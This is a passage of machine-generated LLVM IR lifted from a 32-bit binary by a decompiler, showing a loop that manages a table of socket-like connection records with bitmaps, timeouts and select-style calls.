  %v1_804ee21 = add i32 %v0_804ee19, 12
  %v2_804ee21 = inttoptr i32 %v1_804ee21 to i32*
  %v3_804ee21 = load i32, i32* %v2_804ee21, align 4
  %v1_804ee24 = icmp eq i32 %v3_804ee21, 0
  %v1_804ee26 = icmp eq i1 %v1_804ee24, false
  br i1 %v1_804ee26, label %dec_label_pc_804ee10, label %dec_label_pc_804ee28

dec_label_pc_804ee28:                             ; preds = %dec_label_pc_804ee19, %dec_label_pc_804edf5
  %v1_804ee28 = phi i32 [ %v2_804ee01, %dec_label_pc_804edf5 ], [ %v0_804ee19, %dec_label_pc_804ee19 ]
  %v2_804ee28 = add i32 %v1_804ee28, 16
  %v3_804ee28 = inttoptr i32 %v2_804ee28 to i32*
  store i32 %v6_804eddf, i32* %v3_804ee28, align 4
  %v0_804ee2b = load i32, i32* @esp, align 4
  %v1_804ee2b = add i32 %v0_804ee2b, 126
  %v2_804ee2b = inttoptr i32 %v1_804ee2b to i32*
  %v3_804ee2b = load i32, i32* %v2_804ee2b, align 4
  %v1_804ee2f = trunc i32 %v3_804ee2b to i16
  %v2_804ee2f = load i32, i32* %edx.global-to-local, align 4
  %v3_804ee2f = add i32 %v2_804ee2f, 20
  %v4_804ee2f = inttoptr i32 %v3_804ee2f to i16*
  store i16 %v1_804ee2f, i16* %v4_804ee2f, align 2
  %v0_804ee33 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804ee33, i32* @eax, align 4
  %v0_804ee35 = call i32 @function_804d840()
  store i32 %v0_804ee35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed2d

dec_label_pc_804ee55:                             ; preds = %dec_label_pc_804eded, %dec_label_pc_804ed65, %dec_label_pc_804ed2d, %dec_label_pc_804ee10
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804ee5e = add i32 %v0_804ed5a, 40
  %v2_804ee5e = inttoptr i32 %v1_804ee5e to i32*
  %v3_804ee5e = load i32, i32* %v2_804ee5e, align 4
  %v4_804ee5e = inttoptr i32 %v3_804ee5e to i8*
  %v5_804ee63 = call i8* @_memset(i8* %v4_804ee5e, i32 0, i32 32)
  %v0_804ee65 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804ee65, i32* %ecx.global-to-local, align 4
  %v0_804ee67 = load i32, i32* @esp, align 4
  %v1_804ee67 = add i32 %v0_804ee67, 4
  %v2_804ee67 = inttoptr i32 %v1_804ee67 to i32*
  %v3_804ee67 = load i32, i32* %v2_804ee67, align 4
  %v4_804ee67 = inttoptr i32 %v3_804ee67 to i8*
  %v2_804ee6c = load i32, i32* %eax.global-to-local, align 4
  %v5_804ee6c = call i8* @_memset(i8* %v4_804ee67, i32 %v2_804ee6c, i32 %v0_804ee65)
  %v6_804ee6c = ptrtoint i8* %v5_804ee6c to i32
  store i32 %v6_804ee6c, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804ee72 = load i32, i32* @esp, align 4
  %v1_804ee72 = add i32 %v0_804ee72, 1916
  %v2_804ee72 = inttoptr i32 %v1_804ee72 to i32*
  store i32 0, i32* %v2_804ee72, align 4
  %v0_804eecb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eecb

dec_label_pc_804ee80:                             ; preds = %dec_label_pc_804eecb, %dec_label_pc_804eee9
  %v1_804ee8a = phi i32 [ 30, %dec_label_pc_804eecb ], [ 5, %dec_label_pc_804eee9 ]
  %v0_804ee80 = load i32, i32* @global_var_8055130.9, align 16
  store i32 %v0_804ee80, i32* %eax.global-to-local, align 4
  %v1_804ee85 = add i32 %v2_804eedb, 8
  %v2_804ee85 = inttoptr i32 %v1_804ee85 to i32*
  %v3_804ee85 = load i32, i32* %v2_804ee85, align 4
  %v2_804ee88 = sub i32 %v0_804ee80, %v3_804ee85
  store i32 %v2_804ee88, i32* %eax.global-to-local, align 4
  %tmp816 = icmp ugt i32 %v2_804ee88, %v1_804ee8a
  br i1 %tmp816, label %dec_label_pc_804ef10, label %dec_label_pc_804ee92

dec_label_pc_804ee92:                             ; preds = %dec_label_pc_804ee80
  store i32 %v1_804eee0, i32* %edx.global-to-local, align 4
  %v1_804eef0 = add i32 %v2_804eedb, 4
  %v2_804eef0 = inttoptr i32 %v1_804eef0 to i32*
  %v3_804eef0 = load i32, i32* %v2_804eef0, align 4
  %v1_804eef5 = urem i32 %v3_804eef0, 32
  store i32 %v1_804eef5, i32* %eax.global-to-local, align 4
  %v2_804eef8 = udiv i32 %v3_804eef0, 32
  store i32 %v2_804eef8, i32* %edx.global-to-local, align 4
  %v0_804eefb = load i32, i32* @esp, align 4
  %v2_804eefb = mul nuw nsw i32 %v2_804eef8, 4
  br i1 %v9_804eee0, label %dec_label_pc_804eef0, label %dec_label_pc_804ee95

dec_label_pc_804ee95:                             ; preds = %dec_label_pc_804ee92
  %v3_804eea0 = add nuw nsw i32 %v2_804eefb, 1748
  %v4_804eea0 = add i32 %v3_804eea0, %v0_804eefb
  %v5_804eea0 = inttoptr i32 %v4_804eea0 to i32*
  %v6_804eea0 = load i32, i32* %v5_804eea0, align 4
  %v9_804eea0 = shl i32 1, %v1_804eef5
  %v12_804eea0 = or i32 %v6_804eea0, %v9_804eea0
  store i32 %v12_804eea0, i32* %v5_804eea0, align 4
  %v0_804eea8 = load i32, i32* @ebx, align 4
  %v1_804eea8 = add i32 %v0_804eea8, 4
  %v2_804eea8 = inttoptr i32 %v1_804eea8 to i32*
  %v3_804eea8 = load i32, i32* %v2_804eea8, align 4
  store i32 %v3_804eea8, i32* %eax.global-to-local, align 4
  %v0_804eeab = load i32, i32* @edi, align 4
  %v2_804eeab = sub i32 %v0_804eeab, %v3_804eea8
  %v8_804eeab = xor i32 %v0_804eeab, %v3_804eea8
  %v9_804eeab = xor i32 %v2_804eeab, %v0_804eeab
  %v10_804eeab = and i32 %v9_804eeab, %v8_804eeab
  %v11_804eeab = icmp slt i32 %v10_804eeab, 0
  %v13_804eeab = icmp slt i32 %v2_804eeab, 0
  %v2_804eead = icmp eq i1 %v13_804eeab, %v11_804eeab
  br i1 %v2_804eead, label %dec_label_pc_804eeb1, label %dec_label_pc_804eeaf

dec_label_pc_804eeaf:                             ; preds = %dec_label_pc_804ee95
  store i32 %v3_804eea8, i32* @edi, align 4
  br label %dec_label_pc_804eeb1

dec_label_pc_804eeb1:                             ; preds = %dec_label_pc_804eef0, %dec_label_pc_804eee5, %dec_label_pc_804ee95, %dec_label_pc_804ef49, %dec_label_pc_804ef3d, %dec_label_pc_804ef0a, %dec_label_pc_804eeaf
  %v0_804eeb1 = load i32, i32* @esp, align 4
  %v1_804eeb1 = add i32 %v0_804eeb1, 1916
  %v2_804eeb1 = inttoptr i32 %v1_804eeb1 to i32*
  %v3_804eeb1 = load i32, i32* %v2_804eeb1, align 4
  %v1_804eeb8 = add i32 %v3_804eeb1, 1
  store i32 %v1_804eeb8, i32* %eax.global-to-local, align 4
  store i32 %v1_804eeb8, i32* %v2_804eeb1, align 4
  %v0_804eec0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eec0 = add i32 %v0_804eec0, -255
  %v6_804eec0 = sub i32 254, %v0_804eec0
  %v7_804eec0 = and i32 %v6_804eec0, %v0_804eec0
  %v8_804eec0 = icmp slt i32 %v7_804eec0, 0
  %v9_804eec0 = icmp eq i32 %v1_804eec0, 0
  %v10_804eec0 = icmp slt i32 %v1_804eec0, 0
  %v3_804eec5 = icmp eq i1 %v10_804eec0, %v8_804eec0
  %v4_804eec5 = icmp eq i1 %v9_804eec0, false
  %v5_804eec5 = and i1 %v4_804eec5, %v3_804eec5
  br i1 %v5_804eec5, label %dec_label_pc_804ef5c, label %dec_label_pc_804eecb

dec_label_pc_804eecb:                             ; preds = %dec_label_pc_804eeb1, %dec_label_pc_804ee55
  %v0_804eecb = phi i32 [ %v0_804eec0, %dec_label_pc_804eeb1 ], [ %v0_804eecb.pre, %dec_label_pc_804ee55 ]
  %v0_804eece = load i32, i32* @global_var_8055178.21, align 8
  store i32 %v0_804eece, i32* %eax.global-to-local, align 4
  %v2_804eed3 = mul i32 %v0_804eecb, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804eedb = add i32 %v0_804eece, %v2_804eed3
  store i32 %v2_804eedb, i32* @ebx, align 4
  %v1_804eedd = add i32 %v2_804eedb, 12
  %v2_804eedd = inttoptr i32 %v1_804eedd to i32*
  %v3_804eedd = load i32, i32* %v2_804eedd, align 4
  store i32 %v3_804eedd, i32* %edx.global-to-local, align 4
  %v1_804eee0 = add i32 %v3_804eedd, -1
  %v5_804eee0 = icmp eq i32 %v3_804eedd, 0
  %v9_804eee0 = icmp eq i32 %v1_804eee0, 0
  %v2_804eee3 = or i1 %v5_804eee0, %v9_804eee0
  br i1 %v2_804eee3, label %dec_label_pc_804eee5, label %dec_label_pc_804ee80

dec_label_pc_804eee5:                             ; preds = %dec_label_pc_804eecb
  br i1 %v5_804eee0, label %dec_label_pc_804eeb1, label %dec_label_pc_804eee9

dec_label_pc_804eee9:                             ; preds = %dec_label_pc_804eee5
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ee80

dec_label_pc_804eef0:                             ; preds = %dec_label_pc_804ee92
  %v3_804eefb = add nuw nsw i32 %v2_804eefb, 1620
  %v4_804eefb = add i32 %v3_804eefb, %v0_804eefb
  %v5_804eefb = inttoptr i32 %v4_804eefb to i32*
  %v6_804eefb = load i32, i32* %v5_804eefb, align 4
  %v9_804eefb = shl i32 1, %v1_804eef5
  %v12_804eefb = or i32 %v6_804eefb, %v9_804eefb
  store i32 %v12_804eefb, i32* %v5_804eefb, align 4
  %v0_804ef03 = load i32, i32* @ebx, align 4
  %v1_804ef03 = add i32 %v0_804ef03, 4
  %v2_804ef03 = inttoptr i32 %v1_804ef03 to i32*
  %v3_804ef03 = load i32, i32* %v2_804ef03, align 4
  store i32 %v3_804ef03, i32* %eax.global-to-local, align 4
  %v0_804ef06 = load i32, i32* @esi, align 4
  %v2_804ef06 = sub i32 %v0_804ef06, %v3_804ef03
  %v8_804ef06 = xor i32 %v0_804ef06, %v3_804ef03
  %v9_804ef06 = xor i32 %v2_804ef06, %v0_804ef06
  %v10_804ef06 = and i32 %v9_804ef06, %v8_804ef06
  %v11_804ef06 = icmp slt i32 %v10_804ef06, 0
  %v13_804ef06 = icmp slt i32 %v2_804ef06, 0
  %v2_804ef08 = icmp eq i1 %v13_804ef06, %v11_804ef06
  br i1 %v2_804ef08, label %dec_label_pc_804eeb1, label %dec_label_pc_804ef0a

dec_label_pc_804ef0a:                             ; preds = %dec_label_pc_804eef0
  store i32 %v3_804ef03, i32* @esi, align 4
  br label %dec_label_pc_804eeb1

dec_label_pc_804ef10:                             ; preds = %dec_label_pc_804ee80
  %v0_804ef10 = load i32, i32* @esp, align 4
  %v1_804ef13 = add i32 %v2_804eedb, 4
  %v2_804ef13 = inttoptr i32 %v1_804ef13 to i32*
  %v3_804ef13 = load i32, i32* %v2_804ef13, align 4
  store i32 %v3_804ef13, i32* %edx.global-to-local, align 4
  %v2_804ef16 = add i32 %v0_804ef10, -16
  %v3_804ef16 = inttoptr i32 %v2_804ef16 to i32*
  store i32 %v3_804ef13, i32* %v3_804ef16, align 4
  %v1_804ef17 = call i32 @function_8050f63(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ef17, i32* %eax.global-to-local, align 4
  %v0_804ef1f = load i32, i32* @ebx, align 4
  %v1_804ef1f = add i32 %v0_804ef1f, 4
  %v2_804ef1f = inttoptr i32 %v1_804ef1f to i32*
  store i32 -1, i32* %v2_804ef1f, align 4
  %v0_804ef26 = load i32, i32* @ebx, align 4
  %v1_804ef26 = add i32 %v0_804ef26, 12
  %v2_804ef26 = inttoptr i32 %v1_804ef26 to i32*
  %v3_804ef26 = load i32, i32* %v2_804ef26, align 4
  %tmp817 = icmp ult i32 %v3_804ef26, 3
  br i1 %tmp817, label %dec_label_pc_804ef49, label %dec_label_pc_804ef2c

dec_label_pc_804ef2c:                             ; preds = %dec_label_pc_804ef10
  %v1_804ef2c = add i32 %v0_804ef26, 284
  %v2_804ef2c = inttoptr i32 %v1_804ef2c to i8*
  %v3_804ef2c = load i8, i8* %v2_804ef2c, align 1
  %v4_804ef2c = zext i8 %v3_804ef2c to i32
  %v6_804ef2c = and i32 %v1_804ef17, -256
  %v7_804ef2c = or i32 %v4_804ef2c, %v6_804ef2c
  %v1_804ef32 = add i32 %v7_804ef2c, 1
  %v10_804ef32 = trunc i32 %v1_804ef32 to i8
  store i32 %v1_804ef32, i32* %eax.global-to-local, align 4
  store i8 %v10_804ef32, i8* %v2_804ef2c, align 1
  %v0_804ef39 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef39 = trunc i32 %v0_804ef39 to i8
  %v10_804ef39 = icmp eq i8 %v1_804ef39, 10
  %v0_804ef49.pre = load i32, i32* @ebx, align 4
  br i1 %v10_804ef39, label %dec_label_pc_804ef49, label %dec_label_pc_804ef3d

dec_label_pc_804ef3d:                             ; preds = %dec_label_pc_804ef2c
  store i32 %v0_804ef49.pre, i32* @eax, align 4
  %v0_804ef3f = call i32 @function_804d840()
  store i32 %v0_804ef3f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eeb1

dec_label_pc_804ef49:                             ; preds = %dec_label_pc_804ef2c, %dec_label_pc_804ef10
  %v0_804ef49 = phi i32 [ %v0_804ef26, %dec_label_pc_804ef10 ], [ %v0_804ef49.pre, %dec_label_pc_804ef2c ]
  %v1_804ef49 = add i32 %v0_804ef49, 284
  %v2_804ef49 = inttoptr i32 %v1_804ef49 to i8*
  store i8 0, i8* %v2_804ef49, align 1
  %v0_804ef50 = load i32, i32* @ebx, align 4
  %v1_804ef50 = add i32 %v0_804ef50, 12
  %v2_804ef50 = inttoptr i32 %v1_804ef50 to i32*
  store i32 0, i32* %v2_804ef50, align 4
  br label %dec_label_pc_804eeb1

dec_label_pc_804ef5c:                             ; preds = %dec_label_pc_804eeb1
  %v0_804ef5c = load i32, i32* @esp, align 4
  %v1_804ef5c = add i32 %v0_804ef5c, 1908
  %v2_804ef5c = inttoptr i32 %v1_804ef5c to i32*
  store i32 0, i32* %v2_804ef5c, align 4
  %v0_804ef67 = load i32, i32* @esp, align 4
  %v1_804ef67 = add i32 %v0_804ef67, 1904
  %v2_804ef67 = inttoptr i32 %v1_804ef67 to i32*
  store i32 1, i32* %v2_804ef67, align 4
  %v0_804ef72 = load i32, i32* @esp, align 4
  %v0_804ef75 = load i32, i32* @edi, align 4
  %v1_804ef75 = load i32, i32* @esi, align 4
  %v2_804ef75 = sub i32 %v0_804ef75, %v1_804ef75
  %v8_804ef75 = xor i32 %v1_804ef75, %v0_804ef75
  %v9_804ef75 = xor i32 %v2_804ef75, %v0_804ef75
  %v10_804ef75 = and i32 %v9_804ef75, %v8_804ef75
  %v11_804ef75 = icmp slt i32 %v10_804ef75, 0
  %v13_804ef75 = icmp slt i32 %v2_804ef75, 0
  %v1_804ef77 = add i32 %v0_804ef72, 1904
  %v2_804ef7e = add i32 %v0_804ef72, -16
  %v3_804ef7e = inttoptr i32 %v2_804ef7e to i32*
  store i32 %v1_804ef77, i32* %v3_804ef7e, align 4
  %v1_804ef7f = add i32 %v0_804ef72, -20
  %v2_804ef7f = inttoptr i32 %v1_804ef7f to i32*
  store i32 0, i32* %v2_804ef7f, align 4
  %v1_804ef81 = add i32 %v0_804ef72, 1620
  store i32 %v1_804ef81, i32* %edx.global-to-local, align 4
  %v0_804ef88 = load i32, i32* @edi, align 4
  store i32 %v0_804ef88, i32* %eax.global-to-local, align 4
  %v2_804ef8a = add i32 %v0_804ef72, -24
  %v3_804ef8a = inttoptr i32 %v2_804ef8a to i32*
  store i32 %v1_804ef81, i32* %v3_804ef8a, align 4
  %v1_804ef8b = add i32 %v0_804ef72, 1748
  store i32 %v1_804ef8b, i32* %ecx.global-to-local, align 4
  %v2_804ef92 = add i32 %v0_804ef72, -28
  %v3_804ef92 = inttoptr i32 %v2_804ef92 to i32*
  store i32 %v1_804ef8b, i32* %v3_804ef92, align 4
  %v2_804ef93 = icmp eq i1 %v13_804ef75, %v11_804ef75
  br i1 %v2_804ef93, label %dec_label_pc_804ef5c.dec_label_pc_804ef97_crit_edge, label %dec_label_pc_804ef95

dec_label_pc_804ef5c.dec_label_pc_804ef97_crit_edge: ; preds = %dec_label_pc_804ef5c
  %v0_804ef97.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef97

dec_label_pc_804ef95:                             ; preds = %dec_label_pc_804ef5c
  %v0_804ef95 = load i32, i32* @esi, align 4
  store i32 %v0_804ef95, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef97

dec_label_pc_804ef97:                             ; preds = %dec_label_pc_804ef5c.dec_label_pc_804ef97_crit_edge, %dec_label_pc_804ef95
  %v0_804ef97 = phi i32 [ %v0_804ef97.pre, %dec_label_pc_804ef5c.dec_label_pc_804ef97_crit_edge ], [ %v0_804ef95, %dec_label_pc_804ef95 ]
  %v1_804ef97 = add i32 %v0_804ef97, 1
  store i32 %v1_804ef97, i32* %eax.global-to-local, align 4
  %v2_804ef98 = add i32 %v0_804ef72, -32
  %v3_804ef98 = inttoptr i32 %v2_804ef98 to i32*
  store i32 %v1_804ef97, i32* %v3_804ef98, align 4
  %v0_804ef99 = call i32 @function_805116a()
  store i32 %v0_804ef99, i32* %eax.global-to-local, align 4
  %v0_804ef9e = load i32, i32* @esp, align 4
  %v1_804efa1 = add i32 %v0_804ef9e, 16
  %v2_804efa1 = inttoptr i32 %v1_804efa1 to i32*
  store i32 0, i32* %v2_804efa1, align 4
  %v0_804efa3 = call i32 @function_8051224()
  %v0_804efa8 = load i32, i32* @esp, align 4
  %v1_804efa8 = add i32 %v0_804efa8, 1932
  %v2_804efa8 = inttoptr i32 %v1_804efa8 to i32*
  store i32 0, i32* %v2_804efa8, align 4
  store i32 %v0_804efa3, i32* @global_var_8055130.9, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eff5

dec_label_pc_804efc0:                             ; preds = %dec_label_pc_804f00a, %dec_label_pc_804f0b8
  %v0_804efc8 = phi i32 [ %v0_804f014, %dec_label_pc_804f00a ], [ %v0_804efc8.pre, %dec_label_pc_804f0b8 ]
  %v0_804efc0 = phi i32 [ %v3_804f002, %dec_label_pc_804f00a ], [ %v0_804efc0.pre, %dec_label_pc_804f0b8 ]
  %v2_804efc2 = udiv i32 %v0_804efc0, 32
  store i32 %v2_804efc2, i32* %ecx.global-to-local, align 4
  %v1_804efc5 = urem i32 %v0_804efc0, 32
  store i32 %v1_804efc5, i32* %eax.global-to-local, align 4
  %v2_804efc8 = mul nuw nsw i32 %v2_804efc2, 4
  %v3_804efc8 = add i32 %v0_804efc8, 1748
  %v4_804efc8 = add i32 %v3_804efc8, %v2_804efc8
  %v5_804efc8 = inttoptr i32 %v4_804efc8 to i32*
  %v6_804efc8 = load i32, i32* %v5_804efc8, align 4
  %v9_804efc8 = shl i32 1, %v1_804efc5
  %v10_804efc8 = and i32 %v6_804efc8, %v9_804efc8
  %v11_804efc8 = icmp ne i32 %v10_804efc8, 0
  %v1_804efd0 = zext i1 %v11_804efc8 to i32
  store i32 %v1_804efd0, i32* %eax.global-to-local, align 4
  %v4_804efd3 = icmp eq i1 %v11_804efc8, false
  %v1_804efd5 = icmp eq i1 %v4_804efd3, false
  br i1 %v1_804efd5, label %dec_label_pc_804f0d6.preheader, label %dec_label_pc_804efdb

dec_label_pc_804f0d6.preheader:                   ; preds = %dec_label_pc_804efc0
  %v0_804f0d640 = load i32, i32* @edi, align 4
  %v1_804f0d641 = add i32 %v0_804f0d640, 12
  %v2_804f0d642 = inttoptr i32 %v1_804f0d641 to i32*
  %v3_804f0d643 = load i32, i32* %v2_804f0d642, align 4
  store i32 %v3_804f0d643, i32* %eax.global-to-local, align 4
  %v1_804f0d944 = icmp eq i32 %v3_804f0d643, 0
  br i1 %v1_804f0d944, label %dec_label_pc_804efdb, label %dec_label_pc_804f0e1

dec_label_pc_804efdb:                             ; preds = %dec_label_pc_804f0d6.backedge, %dec_label_pc_804f0d6.preheader, %dec_label_pc_804f62a, %dec_label_pc_804efc0, %dec_label_pc_804eff5, %dec_label_pc_804fb29, %dec_label_pc_804fb1d, %dec_label_pc_804f662
  %v0_804efdb = load i32, i32* @esp, align 4
  %v1_804efdb = add i32 %v0_804efdb, 1916
  %v2_804efdb = inttoptr i32 %v1_804efdb to i32*
  %v3_804efdb = load i32, i32* %v2_804efdb, align 4
  %v1_804efe2 = add i32 %v3_804efdb, 1
  store i32 %v1_804efe2, i32* %eax.global-to-local, align 4
  store i32 %v1_804efe2, i32* %v2_804efdb, align 4
  %v0_804efea = load i32, i32* %eax.global-to-local, align 4
  %v1_804efea = add i32 %v0_804efea, -255
  %v6_804efea = sub i32 254, %v0_804efea
  %v7_804efea = and i32 %v6_804efea, %v0_804efea
  %v8_804efea = icmp slt i32 %v7_804efea, 0
  %v9_804efea = icmp eq i32 %v1_804efea, 0
  %v10_804efea = icmp slt i32 %v1_804efea, 0
  %v3_804efef = icmp eq i1 %v10_804efea, %v8_804efea
  %v4_804efef = icmp eq i1 %v9_804efea, false
  %v5_804efef = and i1 %v4_804efef, %v3_804efef
  br i1 %v5_804efef, label %.loopexit, label %dec_label_pc_804eff5

dec_label_pc_804eff5:                             ; preds = %dec_label_pc_804efdb, %dec_label_pc_804ef97
  %v0_804eff5 = phi i32 [ %v0_804efea, %dec_label_pc_804efdb ], [ 0, %dec_label_pc_804ef97 ]
  %v0_804eff8 = load i32, i32* @global_var_8055178.21, align 8
  store i32 %v0_804eff8, i32* %eax.global-to-local, align 4
  %v2_804effd = mul i32 %v0_804eff5, 288
  %v2_804f000 = add i32 %v0_804eff8, %v2_804effd
  store i32 %v2_804f000, i32* @edi, align 4
  %v1_804f002 = add i32 %v2_804f000, 4
  %v2_804f002 = inttoptr i32 %v1_804f002 to i32*
  %v3_804f002 = load i32, i32* %v2_804f002, align 4
  store i32 %v3_804f002, i32* %ecx.global-to-local, align 4
  %v10_804f005 = icmp eq i32 %v3_804f002, -1
  br i1 %v10_804f005, label %dec_label_pc_804efdb, label %dec_label_pc_804f00a

dec_label_pc_804f00a:                             ; preds = %dec_label_pc_804eff5
  %v2_804f00e = udiv i32 %v3_804f002, 32
  store i32 %v2_804f00e, i32* %edx.global-to-local, align 4
  %v1_804f011 = urem i32 %v3_804f002, 32
  store i32 %v1_804f011, i32* %eax.global-to-local, align 4
  %v0_804f014 = load i32, i32* @esp, align 4
  %v2_804f014 = mul nuw nsw i32 %v2_804f00e, 4
  %v3_804f014 = add nuw nsw i32 %v2_804f014, 1620
  %v4_804f014 = add i32 %v3_804f014, %v0_804f014
  %v5_804f014 = inttoptr i32 %v4_804f014 to i32*
  %v6_804f014 = load i32, i32* %v5_804f014, align 4
  %v9_804f014 = shl i32 1, %v1_804f011
  %v10_804f014 = and i32 %v6_804f014, %v9_804f014
  %v11_804f014 = icmp ne i32 %v10_804f014, 0
  %v1_804f01c = zext i1 %v11_804f014 to i32
  store i32 %v1_804f01c, i32* %eax.global-to-local, align 4
  %v4_804f01f = icmp eq i1 %v11_804f014, false
  br i1 %v4_804f01f, label %dec_label_pc_804efc0, label %dec_label_pc_804f023

dec_label_pc_804f023:                             ; preds = %dec_label_pc_804f00a
  %v1_804f023 = add i32 %v0_804f014, 1920
  %v2_804f023 = inttoptr i32 %v1_804f023 to i32*
  store i32 0, i32* %v2_804f023, align 4
  %v0_804f02e = load i32, i32* @esp, align 4
  %v1_804f02e = add i32 %v0_804f02e, 1912
  %v2_804f02e = inttoptr i32 %v1_804f02e to i32*
  store i32 4, i32* %v2_804f02e, align 4
  %v0_804f039 = load i32, i32* @esp, align 4
  %v1_804f03c = add i32 %v0_804f039, 1912
  store i32 %v1_804f03c, i32* %eax.global-to-local, align 4
  %v2_804f043 = add i32 %v0_804f039, -16
  %v3_804f043 = inttoptr i32 %v2_804f043 to i32*
  store i32 %v1_804f03c, i32* %v3_804f043, align 4
  %v1_804f044 = add i32 %v0_804f039, 1920
  store i32 %v1_804f044, i32* %edx.global-to-local, align 4
  %v2_804f04b = add i32 %v0_804f039, -20
  %v3_804f04b = inttoptr i32 %v2_804f04b to i32*
  store i32 %v1_804f044, i32* %v3_804f04b, align 4
  %v1_804f04c = add i32 %v0_804f039, -24
  %v2_804f04c = inttoptr i32 %v1_804f04c to i32*
  store i32 4, i32* %v2_804f04c, align 4
  %v1_804f04e = add i32 %v0_804f039, -28
  %v2_804f04e = inttoptr i32 %v1_804f04e to i32*
  store i32 1, i32* %v2_804f04e, align 4
  %v0_804f050 = load i32, i32* @edi, align 4
  %v1_804f050 = add i32 %v0_804f050, 4
  %v2_804f050 = inttoptr i32 %v1_804f050 to i32*
  %v3_804f050 = load i32, i32* %v2_804f050, align 4
  store i32 %v3_804f050, i32* %eax.global-to-local, align 4
  %v2_804f053 = add i32 %v0_804f039, -32
  %v3_804f053 = inttoptr i32 %v2_804f053 to i32*
  store i32 %v3_804f050, i32* %v3_804f053, align 4
  %v0_804f054 = call i32 @function_80515c2()
  store i32 %v0_804f054, i32* %eax.global-to-local, align 4
  %v0_804f059 = load i32, i32* @esp, align 4
  %v2_804f05c = add i32 %v0_804f059, 1952
  %v3_804f05c = inttoptr i32 %v2_804f05c to i32*
  %v4_804f05c = load i32, i32* %v3_804f05c, align 4
  %v5_804f05c = or i32 %v4_804f05c, %v0_804f054
  %v6_804f05c = icmp eq i32 %v5_804f05c, 0
  store i32 %v5_804f05c, i32* %eax.global-to-local, align 4
  %v1_804f063 = icmp eq i1 %v6_804f05c, false
  br i1 %v1_804f063, label %dec_label_pc_804fb29, label %dec_label_pc_804f069

dec_label_pc_804f069:                             ; preds = %dec_label_pc_804f023
  %v0_804f069 = load i32, i32* @edi, align 4
  %v1_804f069 = add i32 %v0_804f069, 12
  %v2_804f069 = inttoptr i32 %v1_804f069 to i32*
  store i32 2, i32* %v2_804f069, align 4
  %v0_804f070 = call i32 @function_804d610()
  %v1_804f070 = sext i32 %v0_804f070 to i64
  %v0_804f075 = load i16, i16* @global_var_805512c.22, align 4
  %v1_804f075 = zext i16 %v0_804f075 to i32
  %v0_804f082 = load i32, i32* @global_var_80550e0.23, align 32
  store i32 %v0_804f082, i32* @ebx, align 4
  store i32 %v1_804f075, i32* %ecx.global-to-local, align 4
  %v8_804f08c = zext i16 %v0_804f075 to i64
  %v9_804f08c = udiv i64 %v1_804f070, %v8_804f08c
  %v10_804f08c = trunc i64 %v9_804f08c to i32
  store i32 %v10_804f08c, i32* %eax.global-to-local, align 4
  %v11_804f08c = urem i64 %v1_804f070, %v8_804f08c
  %v12_804f08c = trunc i64 %v11_804f08c to i32
  store i32 %v12_804f08c, i32* %edx.global-to-local, align 4
  %tmp171 = icmp slt i32 %v0_804f082, 1
  br i1 %tmp171, label %dec_label_pc_804fb62, label %dec_label_pc_804f096

dec_label_pc_804f096:                             ; preds = %dec_label_pc_804f069
  %v0_804f096 = load i32, i32* @global_var_8055128.24, align 8
  store i32 %v0_804f096, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f0ac = trunc i64 %v11_804f08c to i16
  br label %dec_label_pc_804f0ac

dec_label_pc_804f0a0:                             ; preds = %dec_label_pc_804f0b2, %dec_label_pc_804f0ac
  %v1_804f0a0 = add i32 %v0_804f0a0, 1
  store i32 %v1_804f0a0, i32* %ecx.global-to-local, align 4
  %v1_804f0a1 = add i32 %v0_804f0a1, 16
  store i32 %v1_804f0a1, i32* %eax.global-to-local, align 4
  %v12_804f0a4 = icmp eq i32 %v0_804f082, %v1_804f0a0
  br i1 %v12_804f0a4, label %dec_label_pc_804fb62, label %dec_label_pc_804f0ac

dec_label_pc_804f0ac:                             ; preds = %dec_label_pc_804f0a0, %dec_label_pc_804f096
  %v0_804f0a0 = phi i32 [ %v1_804f0a0, %dec_label_pc_804f0a0 ], [ 0, %dec_label_pc_804f096 ]
  %v0_804f0a1 = phi i32 [ %v1_804f0a1, %dec_label_pc_804f0a0 ], [ %v0_804f096, %dec_label_pc_804f096 ]
  %v3_804f0ac = add i32 %v0_804f0a1, 8
  %v4_804f0ac = inttoptr i32 %v3_804f0ac to i16*
  %v5_804f0ac = load i16, i16* %v4_804f0ac, align 2
  %v11_804f0ac = icmp ult i16 %v1_804f0ac, %v5_804f0ac
  br i1 %v11_804f0ac, label %dec_label_pc_804f0a0, label %dec_label_pc_804f0b2

dec_label_pc_804f0b2:                             ; preds = %dec_label_pc_804f0ac
  %v3_804f0b2 = add i32 %v0_804f0a1, 10
  %v4_804f0b2 = inttoptr i32 %v3_804f0b2 to i16*
  %v5_804f0b2 = load i16, i16* %v4_804f0b2, align 2
  %v11_804f0b2 = icmp ult i16 %v1_804f0ac, %v5_804f0b2
  %v1_804f0b6 = icmp eq i1 %v11_804f0b2, false
  br i1 %v1_804f0b6, label %dec_label_pc_804f0a0, label %dec_label_pc_804f0b8

dec_label_pc_804f0b8:                             ; preds = %dec_label_pc_804f0b2, %dec_label_pc_804fb62
  %v0_804f0bb = phi i32 [ 0, %dec_label_pc_804fb62 ], [ %v0_804f0a1, %dec_label_pc_804f0b2 ]
  %v0_804f0b8 = load i32, i32* @edi, align 4
  %v1_804f0b8 = add i32 %v0_804f0b8, 4
  %v2_804f0b8 = inttoptr i32 %v1_804f0b8 to i32*
  %v3_804f0b8 = load i32, i32* %v2_804f0b8, align 4
  store i32 %v3_804f0b8, i32* %ecx.global-to-local, align 4
